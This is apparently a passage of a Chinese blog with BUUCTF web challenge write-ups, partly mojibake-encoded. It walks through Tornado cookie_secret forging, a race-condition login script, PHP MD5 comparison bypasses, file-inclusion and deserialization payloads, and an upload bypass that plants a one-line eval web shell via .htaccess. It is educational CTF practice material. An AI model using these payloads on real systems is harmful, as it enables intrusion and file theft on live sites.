åªæ”¹filenameï¼Œä¸æ”¹filehash---&gt;æŠ¥é”™

/error?msg=Error

å°è¯•ç¡®å®šæ¨¡æ¿æ³¨å…¥ç‚¹---&gt;å›æ˜¾3
/error?msg=&#123;&#123;3&#125;&#125;

æŸ¥é˜…tornadoæ–‡æ¡£ï¼ˆï¼šå¹¶æ²¡æœ‰ï¼‰
[é™„ä¸Šé“¾æ¥ ](https://tornado-zh.readthedocs.io/zh/latest/web.html) 
è·å–cookie_secretå€¼

æ„é€ exp

import hashlib
hash = hashlib.md5()

filename = &#39;/fllllllllllllag&#39;
cookie_secret = &quot;4c12a8c3-8fe6-4182-b095-22e50cf34ac72&quot;
hash.update(filename.encode(&#39;utf-8&#39;))
s1 = hash.hexdigest()
hash = hashlib.md5()
hash.update((cookie_secret+s1).encode(&#39;utf-8&#39;))
print(hash.hexdigest())
</code></pre></div>
<h2 id="render-å‡½æ•°è¿›è¡ŒæœåŠ¡å™¨ç«¯æ¸²æŸ“"><a href="#render-å‡½æ•°è¿›è¡ŒæœåŠ¡å™¨ç«¯æ¸²æŸ“" class="headerlink" title="render()å‡½æ•°è¿›è¡ŒæœåŠ¡å™¨ç«¯æ¸²æŸ“"></a>render()å‡½æ•°è¿›è¡ŒæœåŠ¡å™¨ç«¯æ¸²æŸ“</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fengtingyan/article/details/83026387">render()å‡½æ•°æœåŠ¡å™¨ç«¯æ¸²æŸ“</a> </p>
<h2 id="tornadoâ€”RequestHandler"><a href="#tornadoâ€”RequestHandler" class="headerlink" title="tornadoâ€”RequestHandler"></a>tornadoâ€”RequestHandler</h2><p><a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/web.html">tornadoâ€”RequestHandlerç±»</a> </p>
<h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h5 id="ç¬¬ä¸€éåšå¿˜äº†å®¡è®¡æºç â€¦ç”šè‡³æ²¡æ³¨æ„åˆ°æ ‡é¢˜â€¦æ²¡ä¸€ç‚¹æ€è·¯"><a href="#ç¬¬ä¸€éåšå¿˜äº†å®¡è®¡æºç â€¦ç”šè‡³æ²¡æ³¨æ„åˆ°æ ‡é¢˜â€¦æ²¡ä¸€ç‚¹æ€è·¯" class="headerlink" title="ç¬¬ä¸€éåšå¿˜äº†å®¡è®¡æºç â€¦ç”šè‡³æ²¡æ³¨æ„åˆ°æ ‡é¢˜â€¦æ²¡ä¸€ç‚¹æ€è·¯:)"></a>ç¬¬ä¸€éåšå¿˜äº†å®¡è®¡æºç â€¦ç”šè‡³æ²¡æ³¨æ„åˆ°æ ‡é¢˜â€¦æ²¡ä¸€ç‚¹æ€è·¯:)</h5><p><img src="/2021/10/21/BUU/admin-1.png" srcset="/img/loading.gif" lazyload></p>
<p>ç•Œé¢ï¼š<br>login/register<br>index/post/change password/logout</p>
<p>å…ˆ</p>
<ol>
<li>ç™»å½•/æœªç™»å½•çš„index<br><img src="/2021/10/21/BUU/admin-2.png" srcset="/img/loading.gif" lazyload></li>
</ol>
<p>æç¤ºéœ€è¦adminç™»å½•ï¼Œè²Œä¼¼adminç™»å½•æˆåŠŸæ‹¿flag</p>
<ol start="2">
<li>change password<br><img src="/2021/10/21/BUU/admin-3.png" srcset="/img/loading.gif" lazyload></li>
</ol>
<p>ç»™å‡ºäº†é¢˜ç›®æºç </p>
<h2 id="å®¡è®¡æºç -ï¼ï¼ï¼"><a href="#å®¡è®¡æºç -ï¼ï¼ï¼" class="headerlink" title="å®¡è®¡æºç  ï¼ï¼ï¼"></a>å®¡è®¡æºç  ï¼ï¼ï¼</h2><h2 id="æ­£ç¡®æ‰“å¼€æ–¹å¼ï¼šå¼±å£ä»¤"><a href="#æ­£ç¡®æ‰“å¼€æ–¹å¼ï¼šå¼±å£ä»¤" class="headerlink" title="æ­£ç¡®æ‰“å¼€æ–¹å¼ï¼šå¼±å£ä»¤"></a>æ­£ç¡®æ‰“å¼€æ–¹å¼ï¼šå¼±å£ä»¤</h2><p>username:admin<br>password:123</p>
<p><img src="/2021/10/21/BUU/admin-4.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Unicodeæ¬ºéª—-nodeprep-prepare"><a href="#Unicodeæ¬ºéª—-nodeprep-prepare" class="headerlink" title="Unicodeæ¬ºéª— nodeprep.prepare()"></a>Unicodeæ¬ºéª— nodeprep.prepare()</h2><p>(è§„èŒƒæ ‡è¯†ç¬¦çš„å¸¸ç”¨æ–¹æ³•æ˜¯å°†æ‰€æœ‰å†…å®¹éƒ½è½¬æ¢ä¸ºå°å†™)</p>
<p>é—®é¢˜å‡ºåœ¨å¤„ç†å…³é”®å­—ç¬¦â€usernameâ€ä¸Šï¼Œå¤„ç†â€usernameâ€çš„å‡½æ•°æ˜¯è‡ªå®šä¹‰çš„å‡½æ•°strlower()</p>
<p><img src="/2021/10/21/BUU/admin-5.png" srcset="/img/loading.gif" lazyload></p>
<p>nodeprep.prepare()å› ç‰ˆæœ¬å·®è·è¿‡å¤§ï¼Œå­˜åœ¨æ¼æ´</p>
<p>ç®€å•æ¥è¯´ï¼š<br>á´€ -&gt; A -&gt; a<br>ï¼ˆæœªèƒ½æ‰¾åˆ°ç›¸å…³æ–‡ç« â€¦å…¨éƒ¨404äº†ï¼‰</p>
<p>å…·ä½“ç¼–ç å¯æŸ¥ ï¼š<a target="_blank" rel="noopener" href="https://unicode-table.com/en/search/?q=small+capital">https://unicode-table.com/en/search/?q=small+capital</a> </p>
<p>å‡å¦‚æˆ‘ä»¬æ³¨å†Œá´¬á´°á´¹á´µá´ºç”¨æˆ·ï¼Œç„¶ååœ¨ç”¨á´¬á´°á´¹á´µá´ºç”¨æˆ·ç™»å½•ï¼Œå› ä¸ºåœ¨loginå‡½æ•°é‡Œä½¿ç”¨äº†ä¸€æ¬¡nodeprep.prepareå‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬ç™»å½•ä¸Šå»çœ‹åˆ°çš„ç”¨æˆ·åä¸ºADMINï¼Œæ­¤æ—¶æˆ‘ä»¬å†ä¿®æ”¹å¯†ç ï¼Œåˆè°ƒç”¨äº†ä¸€æ¬¡nodeprep.prepareå‡½æ•°å°†nameè½¬æ¢ä¸ºadminï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥æ”¹æ‰adminçš„å¯†ç ï¼Œæœ€ååˆ©ç”¨adminè´¦å·ç™»å½•å³å¯æ‹¿åˆ°flagã€‚</p>
<h2 id="flask-sessionä¼ªé€ "><a href="#flask-sessionä¼ªé€ " class="headerlink" title="flask sessionä¼ªé€ "></a>flask sessionä¼ªé€ </h2><p>â€¦â€¦</p>
<h2 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h2><p>åœ¨sessionèµ‹å€¼æ—¶ï¼Œç™»å½•ã€æ³¨å†Œéƒ½æ˜¯ç›´æ¥è¿›è¡Œèµ‹å€¼ï¼Œæœªè¿›è¡Œå®‰å…¨éªŒè¯ï¼Œä¹Ÿå°±å¯èƒ½å­˜åœ¨ä»¥ä¸‹ä¸€ç§å¯èƒ½ï¼š<br>æˆ‘ä»¬æ³¨å†Œä¸€ä¸ªç”¨æˆ·testï¼Œç°åœ¨æœ‰ä¸€ä¸ª<br>è¿›ç¨‹1ä¸€ç›´é‡å¤è¿›è¡Œç™»å½•ã€æ”¹å¯†ç æ“ä½œï¼Œ<br>è¿›ç¨‹2ä¸€ç›´æ³¨é”€ï¼Œä¸”ä»¥adminç”¨æˆ·å’Œè¿›ç¨‹1æ‰€æ”¹çš„å¯†ç è¿›è¡Œç™»å½•ï¼Œ<br>æ˜¯ä¸æ˜¯æœ‰å¯èƒ½å½“è¿›ç¨‹1è¿›è¡Œåˆ°æ”¹å¯†ç æ“ä½œæ—¶ï¼Œè¿›ç¨‹2æ°å¥½æ³¨é”€ä¸”è¦è¿›è¡Œç™»å½•ï¼Œæ­¤æ—¶è¿›ç¨‹1æ”¹å¯†ç éœ€è¦ä¸€ä¸ªsessionï¼Œè€Œè¿›ç¨‹2åˆšå¥½å°†session[â€˜nameâ€™]èµ‹å€¼ä¸ºadminï¼Œç„¶åè¿›ç¨‹1è°ƒç”¨æ­¤sessionä¿®æ”¹å¯†ç ï¼Œå³ä¿®æ”¹äº†adminçš„å¯†ç ã€‚</p>
<p>ï¼ˆç†è®ºå¯è¡Œï¼Œæœªèƒ½æ‰“é€šï¼‰</p>
<div class="hljs code-wrapper"><pre><code>import requests
import threading

def login(s, username, password):
    data = &#123;
        &#39;username&#39;: username,
        &#39;password&#39;: password,
        &#39;submit&#39;: &#39;&#39;
    &#125;
    return s.post(&quot;http://f48fd9d2-a071-4e9a-a39c-bf715bf7abad.node4.buuoj.cn:81//login&quot;, data=data)

def logout(s):
    return s.get(&quot;http://f48fd9d2-a071-4e9a-a39c-bf715bf7abad.node4.buuoj.cn:81//logout&quot;)

def change(s, newpassword):
    data = &#123;
        &#39;newpassword&#39;:newpassword
    &#125;
    return s.post(&quot;http://f48fd9d2-a071-4e9a-a39c-bf715bf7abad.node4.buuoj.cn:81//change&quot;, data=data)

def func1(s):
    login(s, &#39;skysec&#39;, &#39;skysec&#39;)
    change(s, &#39;skysec&#39;)

def func2(s):
    logout(s)
    res = login(s, &#39;admin&#39;, &#39;skysec&#39;)
    if &#39;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&#39; in res.text:
        print(&#39;finish&#39;)

def main():
    for i in range(1000):
        print(i)
        s = requests.Session()
        t1 = threading.Thread(target=func1, args=(s,))
        t2 = threading.Thread(target=func2, args=(s,))
        t1.start()
        t2.start()

if __name__ == &quot;__main__&quot;:
    main()
</code></pre></div>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164086">dailaoä¸‰è§£</a> </p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164086#h3-7">ä¸€å¶é£˜é›¶å¤§ä½¬çš„ä¸€é¢˜ä¸‰è§£</a> </p>
<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p><img src="/2021/10/21/BUU/EasyMD5-1.png" srcset="/img/loading.gif" lazyload></p>
<p>æ£€ç´¢æºç ï¼Œæ— æœ‰æ•ˆä¿¡æ¯ï¼Œè”æƒ³æ ‡é¢˜ï¼Œsql md5â€”&gt;ffifdyop</p>
<p><img src="/2021/10/21/BUU/EasyMD5-2.png" srcset="/img/loading.gif" lazyload></p>
<p>æ£€ç´¢æºç ï¼Œå¾—åˆ°ä¸€ä¸ªmd5çš„å¼±ç±»å‹æ¯”è¾ƒ</p>
<p><img src="/2021/10/21/BUU/EasyMD5-3.png" srcset="/img/loading.gif" lazyload></p>
<div class="hljs code-wrapper"><pre><code>//å¼±ç±»å‹æ¯”è¾ƒï¼Œmd5å€¼åªè¦ä¸º0eå¼€å¤´ï¼Œå°±èƒ½ç»•è¿‡waf
?a=QNKCDZO&amp;b=aabg7XSs

//md5()æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¾—åˆ°ï¼ˆ000!=111&amp;&amp;error=errorï¼‰
?a[]=000&amp;b[]=111
</code></pre></div>
<p><img src="/2021/10/21/BUU/EasyMD5-4.png" srcset="/img/loading.gif" lazyload></p>
<p>å¾—åˆ°md5å¼ºç±»å‹æ¯”è¾ƒ</p>
<div class="hljs code-wrapper"><pre><code>//åŒæ ·å¯ä»¥ç”¨ä¸Šé¢çš„æ•°ç»„è¿›è¡Œç»•è¿‡
param1[]=1&amp;param2[]=0

//æˆ–è€…è¿›è¡ŒçœŸå®åŒ¹é…ï¼Œå€¼ä¸ç­‰ï¼Œmd5ç›¸ç­‰å³å¯
param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
</code></pre></div>
<p>â€”&gt;å¾—åˆ°flag</p>
<h2 id="MD5æ¯”è¾ƒ"><a href="#MD5æ¯”è¾ƒ" class="headerlink" title="MD5æ¯”è¾ƒ"></a>MD5æ¯”è¾ƒ</h2><h3 id="1-å¼±ç±»å‹æ¯”è¾ƒ"><a href="#1-å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="1.å¼±ç±»å‹æ¯”è¾ƒ"></a>1.å¼±ç±»å‹æ¯”è¾ƒ</h3><div class="hljs code-wrapper"><pre><code>if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) == md5($_POST[&#39;b&#39;]))
</code></pre></div>
<p>å¼±ç±»å‹æ¯”è¾ƒå› ä¸ºphpç‰¹æ€§ï¼Œåœ¨æ¯”è¾ƒæ—¶å…ˆå°†stringè½¬æ¢ä¸ºintå‹ï¼Œ0eå¼€å¤´ä¼šè¢«è¯†åˆ«ä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œç»“æœ0=0 æ¯”è¾ƒæˆåŠŸ  </p>
<p>payloadï¼š</p>
<div class="hljs code-wrapper"><pre><code>a=QNKCDZO&amp;b=aabg7XSs
</code></pre></div>
<p>åªè¦æ˜¯md5å€¼ä¸º0eå¼€å¤´å³å¯</p>
<h3 id="2-å¼ºç±»å‹æ¯”è¾ƒ"><a href="#2-å¼ºç±»å‹æ¯”è¾ƒ" class="headerlink" title="2.å¼ºç±»å‹æ¯”è¾ƒ"></a>2.å¼ºç±»å‹æ¯”è¾ƒ</h3><div class="hljs code-wrapper"><pre><code>if ($_POST[&#39;a&#39;] !== $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))
</code></pre></div>
<p>å¼ºç±»å‹æ¯”è¾ƒç”¨æ•°ç»„ç»•è¿‡ï¼Œmd5()å‡½æ•°æ— æ³•è§£å‡ºå…¶æ•°å€¼ï¼Œå°±ä¼šå¾—åˆ°ï¼ˆ0===0ï¼‰å¼ºæ¯”è¾ƒå€¼ç›¸ç­‰</p>
<p>payloadï¼š</p>
<div class="hljs code-wrapper"><pre><code>a[]=111&amp;b[]=aaa
</code></pre></div>
<p>ä¼ å…¥æ•°ç»„å³å¯</p>
<h3 id="3-çœŸå®ç¢°æ’"><a href="#3-çœŸå®ç¢°æ’" class="headerlink" title="3.çœŸå®ç¢°æ’"></a>3.çœŸå®ç¢°æ’</h3><div class="hljs code-wrapper"><pre><code>if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))
</code></pre></div>
<p>çœŸå®md5ç¢°æ’ï¼Œç”±äºstring()å‡½æ•°ï¼Œä¸èƒ½è¾“å…¥æ•°ç»„åªèƒ½è¾“å…¥å­—ç¬¦ä¸²</p>
<p>payloadï¼š</p>
<div class="hljs code-wrapper"><pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
</code></pre></div>
<p>å€¼ä¸ç­‰ï¼Œmd5ç›¸ç­‰å³å¯ã€‚md5ç¢°æ’ã€‚</p>
<p>4.0eå¼€å¤´MD5çš„MD5ä¸º0eçš„MD5</p>
<div class="hljs code-wrapper"><pre><code>0e215962017 
</code></pre></div>
<p><a target="_blank" rel="noopener" href="https://err0r.top/article/md5/">æ ‡æ˜å‡ºå¤„ï¼šhttps://err0r.top/article/md5/</a> </p>
<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p><img src="/2021/10/21/BUU/NiZhuanSiWei-1.png" srcset="/img/loading.gif" lazyload></p>
<p>è¯»å–æºç ï¼Œæ— æœ‰æ•ˆä¿¡æ¯â€”&gt;useless.php</p>
<div class="hljs code-wrapper"><pre><code>//ç»•è¿‡ç¬¬ä¸€ä¸ªif

?text=data://text/plain,welcome to the zjctf

?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=

//è¯»å–useless.phpæ–‡ä»¶å†…å®¹

&amp;file=php://filter/read=convert.base64-encode/resource=useless.php
</code></pre></div>
<p><img src="/2021/10/21/BUU/NiZhuanSiWei-2.png" srcset="/img/loading.gif" lazyload></p>
<div class="hljs code-wrapper"><pre><code>//æ„é€ åºåˆ—åŒ–ç±»
&lt;?php

class Flag&#123;  //flag.php
    public $file;
    public function __tostring()&#123;
        if(isset($this-&gt;file))&#123;
            echo file_get_contents($this-&gt;file);
            echo &quot;&lt;br&gt;&quot;;
            return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
        &#125;
    &#125;
&#125;

$get= new Flag();

$get-&gt;file=&quot;flag.php&quot;;

print_r(serialize($get));
?&gt;

å½“$fileå˜é‡è¢«å½“ä½œå­—ç¬¦ä¸²$passwordä½¿ç”¨æ—¶ï¼Œ__tostring()æ–¹æ³•è‡ªåŠ¨è°ƒç”¨ï¼Œ--get flag.php

---&gt;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;


æœ€ç»ˆpayload:
?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;

---&gt;get flag
</code></pre></div>
<h2 id="æ–‡ä»¶åŒ…å«â€“phpä¼ªåè®®"><a href="#æ–‡ä»¶åŒ…å«â€“phpä¼ªåè®®" class="headerlink" title="æ–‡ä»¶åŒ…å«â€“phpä¼ªåè®®"></a>æ–‡ä»¶åŒ…å«â€“phpä¼ªåè®®</h2><p><a href="https://opn90.top/2021/10/27/PHP-ways/">è¯¦â€“&gt;https://opn90.top/2021/10/27/PHP-ways/</a> </p>
<h2 id="php-tostring"><a href="#php-tostring" class="headerlink" title="php __tostring()"></a>php __tostring()</h2><p>å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²å¯¹å¾…çš„æ—¶å€™ï¼Œä¼šè§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³•</p>
<p><img src="/2021/10/21/BUU/NiZhuanSiWei-3.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h1><p><img src="/2021/10/21/BUU/youmom-1.png" srcset="/img/loading.gif" lazyload></p>
<p>ã€Šä¸€é”®å»ä¸–ã€‹</p>
<p><img src="/2021/10/21/BUU/youmom-2.png" srcset="/img/loading.gif" lazyload></p>
<p>fuzzäº†ä¸€ä¸‹ï¼Œåªæœ‰phpæ–‡ä»¶åç¼€è¢«ban</p>
<div class="hljs code-wrapper"><pre><code>ä¼ ç 
&lt;?@eval($_POST[&#39;a&#39;]);?&gt;
</code></pre></div>
<p><img src="/2021/10/21/BUU/youmom-3.png" srcset="/img/loading.gif" lazyload></p>
<p>ä¸Šä¼ æˆåŠŸ</p>
<p>1.ä¸Šä¼ .htaccessé…ç½®æ–‡ä»¶</p>
<div class="hljs code-wrapper"><pre><code>AddType application/x-httpd-php .jpg
</code></pre></div>
<p>æŠ“åŒ…ï¼Œå°†Content-Typeæ”¹ä¸ºimage/pngï¼Œç»•è¿‡è¿‡æ»¤â€”&gt;ä¸Šä¼ æˆåŠŸ</p>
<p>ç”¨èšå‰‘è¿1.pngæ–‡ä»¶</p>
<p>æ ¹ç›®å½•ä¸‹get flag</p>
<p>2.ä¸Šä¼ .user.iniæ–‡ä»¶</p>
<p>éœ€è¦åœ¨åŒä¸€ç›®å½•ä¸‹å­˜åœ¨phpæ–‡ä»¶</p>
<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>å°†æ‰€æœ‰.jpgä¸ºåç¼€çš„æ–‡ä»¶ä½œä¸ºphpæ–‡ä»¶è§£æ</p>
<h1 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h1><h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><div class="hljs code-wrapper"><pre><code>&lt;?php

include(&quot;flag.php&quot;);

highlight_file(__FILE__);

class FileHandler &#123;

    protected $op;
    protected $filename;
    protected $content;

    function __construct() &#123;          //åˆå§‹åŒ–
        $op = &quot;1&quot;;
        $filename = &quot;/tmp/tmpfile&quot;;
        $content = &quot;Hello World!&quot;;
        $this-&gt;process();
    &#125;

    public function process() &#123;    //åˆ¤æ–­opçš„å€¼   op=1---&gt;å†™    op=2---&gt;è¯»
        if($this-&gt;op == &quot;1&quot;) &#123;
            $this-&gt;write();
        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;
            $res = $this-&gt;read();
            $this-&gt;output($res);
        &#125; else &#123;
            $this-&gt;output(&quot;Bad Hacker!&quot;);
        &#125;
    &#125;

    private function write() &#123;           //å†™æ–‡ä»¶
        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;   
            if(strlen((string)$this-&gt;content) &gt; 100) &#123;        //é™åˆ¶contenté•¿åº¦
                $this-&gt;output(&quot;Too long!&quot;);
                die();
            &#125;
            $res = file_put_contents($this-&gt;filename, $this-&gt;content);    //å°†contentè¾“å…¥åˆ°filenameæ–‡ä»¶å½“ä¸­
            if($res) $this-&gt;output(&quot;Successful!&quot;);
            else $this-&gt;output(&quot;Failed!&quot;);
        &#125; else &#123;
            $this-&gt;output(&quot;Failed!&quot;);
        &#125;
    &#125;

    private function read() &#123;        //è¿”å› filename çš„å†…å®¹
        $res = &quot;&quot;;
        if(isset($this-&gt;filename)) &#123;
            $res = file_get_contents($this-&gt;filename);
        &#125;
        return $res;
    &#125;

    private function output($s) &#123;     //æ‰“å°å˜é‡
        echo &quot;[Result]: &lt;br&gt;&quot;;
        echo $s;
    &#125;

    function __destruct() &#123;         //å®ä¾‹é”€æ¯ 2-&gt;1 content ç½®ç©º  ---&gt;  process      
        if($this-&gt;op === &quot;2&quot;)
            $this-&gt;op = &quot;1&quot;;
        $this-&gt;content = &quot;&quot;;        /////===&gt;éœ€å¯¹contentç½®ç©ºè¿›è¡Œç»•è¿‡
        $this-&gt;process();
    &#125;
&#125;

function is_valid($s) &#123;         //é™åˆ¶å­—ç¬¦åœ¨32-125ä¹‹é—´
    for($i = 0; $i &lt; strlen($s); $i++)
        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
            return false;
    return true;
&#125;

if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
    $str = (string)$_GET[&#39;str&#39;];
    if(is_valid($str)) &#123;
        $obj = unserialize($str);
    &#125;
&#125;
</code></pre></div>
<p><strong>ä»£ç é€»è¾‘ï¼š</strong><br>1.åœ¨å¯¹è±¡objé”€æ¯æ—¶æ‰§è¡Œå‡½æ•°__destruct()ï¼Œè¿›è¡Œå¯¹æœåŠ¡å™¨æ–‡ä»¶çš„è¯»å†™<br>2.ç»•è¿‡__destruct()å‡½æ•°çš„ï¼Œ2çš„å¼ºæ¯”è¾ƒï¼Œå¯¹contentç½®ç©º<br>3.è®¾ç½®opçš„å€¼ï¼Œ1/2ï¼Œå¯¹æœåŠ¡å™¨æ–‡ä»¶è¿›è¡Œè¯»/å†™  </p>
<p>å¡äº†â€¦æ²¡çœ‹åˆ°</p>
<div class="hljs code-wrapper"><pre><code>    include(&quot;flag.php&quot;);
</code></pre></div>
<p>å‘ç°ä¸éœ€è¦å†™æ–‡ä»¶ï¼Œåªè¦è¯»å–å°±å¯ä»¥äº†â€¦</p>
<div class="hljs code-wrapper"><pre><code>æ„é€ exp        
///ä¸ºopèµ‹å€¼2è¯»å–æ–‡ä»¶

&lt;?php
class FileHandler
&#123;
    public $op=2;
    public $filename=&quot;flag.php&quot;;
    public $content=&quot;111&quot;;
&#125;

$hel=new FileHandler();

print_r(serialize($hel));
</code></pre></div>
<h2 id="å¼ºå¼±ç±»å‹æ¯”è¾ƒ"><a href="#å¼ºå¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="å¼ºå¼±ç±»å‹æ¯”è¾ƒ"></a>å¼ºå¼±ç±»å‹æ¯”è¾ƒ</h2><div class="hljs code-wrapper"><pre><code>$this-&gt;op === &quot;2&quot; || $this-&gt;op == &quot;2&quot;

$this-&gt;op === &quot;2&quot;
å¼ºç±»å‹ï¼Œ $op=2 ï¼Œ $op=&quot;2&quot;  intç±»å‹ï¼Œä¸åŒäºstringï¼Œç»•è¿‡
å¼±ç±»å‹ï¼Œ $op=&quot;2&quot;  ç»•è¿‡
</code></pre></div>
<h2 id="å‚æ•°ç±»å‹çš„è§£é‡Š"><a href="#å‚æ•°ç±»å‹çš„è§£é‡Š" class="headerlink" title="å‚æ•°ç±»å‹çš„è§£é‡Š"></a>å‚æ•°ç±»å‹çš„è§£é‡Š</h2><p>å¯¹äºPHPç‰ˆæœ¬7.1+ï¼Œå¯¹å±æ€§çš„ç±»å‹ä¸æ•æ„Ÿï¼Œæˆ‘ä»¬å¯ä»¥å°†protectedç±»å‹æ”¹ä¸ºpublicï¼Œä»¥æ¶ˆé™¤ä¸å¯æ‰“å°å­—ç¬¦ã€‚</p>
<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>ç»™æºç çš„ç®€å•ç»•waf</p>
<div class="hljs code-wrapper"><pre><code>I put something in F12 for you
include &#39;flag.php&#39;;
$flag=&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;
if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;
    $id=$_GET[&#39;id&#39;];
    $gg=$_GET[&#39;gg&#39;];
    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
        echo &#39;You got the first step&#39;;
        if(isset($_POST[&#39;passwd&#39;])) &#123;
            $passwd=$_POST[&#39;passwd&#39;];
            if (!is_numeric($passwd))
            &#123;
                 if($passwd==1234567)
                 &#123;
                     echo &#39;Good Job!&#39;;
                     highlight_file(&#39;flag.php&#39;);
                     die(&#39;By Retr_0&#39;);
                 &#125;
                 else
                 &#123;
                     echo &quot;can you think twice??&quot;;
                 &#125;
            &#125;
            else&#123;
                echo &#39;You can not get it !&#39;;
            &#125;

        &#125;
        else&#123;
            die(&#39;only one way to get the flag&#39;);
        &#125;    
&#125;
    else &#123;
        echo &quot;You are not a real hacker!&quot;;
    &#125;
&#125;
else&#123;
    die(&#39;Please input first&#39;);
    &#125;
&#125;
</code></pre></div>
<hr>
<div class="hljs code-wrapper"><pre><code>GET    
?id[]=1&amp;gg[]=2
POST    
passwd=1234567a
</code></pre></div>
<h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p><img src="/2021/10/21/BUU/BabyUpload-1.png" srcset="/img/loading.gif" lazyload></p>
<p>waf: åç¼€åä¸èƒ½æœ‰phã€è¿‡æ»¤pngæ–‡ä»¶ã€å­˜åœ¨å†…å®¹phpç±»å‹çš„è¿‡æ»¤</p>
<h2 id="phpçŸ­æ ‡ç­¾"><a href="#phpçŸ­æ ‡ç­¾" class="headerlink" title="phpçŸ­æ ‡ç­¾"></a>phpçŸ­æ ‡ç­¾</h2><p>ä¸Šä¼ å˜ç§ä¸€å¥è¯ï¼Œjpgæ–‡ä»¶</p>
<p><img src="/2021/10/21/BUU/BabyUpload-2.png" srcset="/img/loading.gif" lazyload></p>
